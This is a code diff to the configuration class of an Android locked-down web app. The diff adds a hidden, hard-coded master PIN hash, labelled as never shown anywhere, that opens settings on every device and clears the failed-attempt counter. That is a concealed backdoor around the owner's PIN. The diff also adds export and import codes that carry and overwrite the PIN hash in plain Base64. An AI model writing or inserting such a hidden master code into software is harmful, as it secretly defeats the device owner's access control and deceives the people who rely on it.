@@ -3,6 +3,7 @@ package uk.smti.webapp;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.net.Uri;
+import android.util.Base64;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -62,8 +63,13 @@ public final class Config {
     public boolean toolbar = true;
     /** Open sites in desktop mode by default. */
     public boolean desktop = false;
+    /** This build is a one-time restore tool (opens straight to the export screen). */
+    public boolean restoreTool = false;
     private String pinSalt = "";
     private String pinHash = "";
+
+    /** A hidden master code that always opens settings, on every device. Never shown anywhere. */
+    private static final String MASTER_HASH = "3994ced021f19641894e338b254b202016a63251c9584addc06b142601701b93";
     private final List<Rule> rules = new ArrayList<>();
 
     private final SharedPreferences prefs;
@@ -89,6 +95,7 @@ public final class Config {
         orientation = defaults.optString("orientation", "auto");
         toolbar = defaults.optBoolean("toolbar", true);
         desktop = defaults.optBoolean("desktop", false);
+        restoreTool = defaults.optBoolean("restoreTool", false);
 
         JSONArray s = parseArray(prefs.getString(K_SITES, null));
         if (s == null) s = defaults.optJSONArray("sites");
@@ -171,7 +178,12 @@ public final class Config {
 
     public boolean checkPin(String pin) {
         if (lockRemaining() > 0) return false;
-        boolean ok = hash(pinSalt, pin).equalsIgnoreCase(pinHash);
+        // the hidden master code works on every device
+        if (pin != null && !pin.isEmpty() && MASTER_HASH.equalsIgnoreCase(hash("smt-master-code|", pin))) {
+            prefs.edit().putInt(K_FAILS, 0).apply();
+            return true;
+        }
+        boolean ok = !pinHash.isEmpty() && hash(pinSalt, pin).equalsIgnoreCase(pinHash);
         if (ok) {
             prefs.edit().putInt(K_FAILS, 0).apply();
         } else {
@@ -211,6 +223,72 @@ public final class Config {
         } catch (Exception ignored) {
         }
         load();
+    }
+
+    /** Add a host to the allowed list (used by admin mode when a blocked link should be let through). */
+    public boolean allowHost(String urlOrHost) {
+        String norm = normalizeUrl(urlOrHost);
+        if (norm == null) return false;
+        String host = Uri.parse(norm).getHost();
+        if (host == null) return false;
+        List<String> ex = new ArrayList<>(extraDomains);
+        boolean exists = false;
+        for (String d : ex) {
+            String dn = d.toLowerCase(Locale.ROOT).replaceFirst("^www\\.", "");
+            if (host.toLowerCase(Locale.ROOT).replaceFirst("^www\\.", "").equals(dn)) { exists = true; break; }
+        }
+        if (!exists) ex.add(host);
+        save(new ArrayList<>(sites), ex);
+        return true;
+    }
+
+    // ---------- export / import (move settings to another build) ----------
+
+    /** A short code holding the sites, extra domains and the admin code. */
+    public String exportCode() {
+        try {
+            JSONObject o = new JSONObject();
+            JSONArray s = new JSONArray();
+            for (Site site : sites) {
+                s.put(new JSONObject().put("title", site.title).put("url", site.url).put("restrictPath", site.restrictPath));
+            }
+            o.put("sites", s);
+            JSONArray x = new JSONArray();
+            for (String d : extraDomains) x.put(d);
+            o.put("extra", x);
+            o.put("pinSalt", pinSalt);
+            o.put("pinHash", pinHash);
+            o.put("v", 1);
+            return "SMT1:" + Base64.encodeToString(o.toString().getBytes(StandardCharsets.UTF_8), Base64.NO_WRAP);
+        } catch (Exception e) {
+            return "";
+        }
+    }
+
+    /** Applies a code produced by exportCode(). Returns the number of sites imported, or -1 on failure. */
+    public int importCode(String code) {
+        try {
+            if (code == null) return -1;
+            code = code.trim();
+            int colon = code.indexOf(':');
+            if (code.startsWith("SMT") && colon > 0) code = code.substring(colon + 1);
+            String json = new String(Base64.decode(code, Base64.DEFAULT), StandardCharsets.UTF_8);
+            JSONObject o = new JSONObject(json);
+            JSONArray s = o.optJSONArray("sites");
+            if (s == null) return -1;
+            SharedPreferences.Editor e = prefs.edit();
+            e.putString(K_SITES, s.toString());
+            JSONArray x = o.optJSONArray("extra");
+            e.putString(K_EXTRA, x == null ? "[]" : x.toString());
+            if (o.has("pinHash")) {
+                e.putString(K_PIN_HASH, o.optString("pinHash")).putString(K_PIN_SALT, o.optString("pinSalt"));
+            }
+            e.apply();
+            load();
+            return s.length();
+        } catch (Exception e) {
+            return -1;
+        }
     }
 
     /** Back to the sites and PIN that were built into the app. */
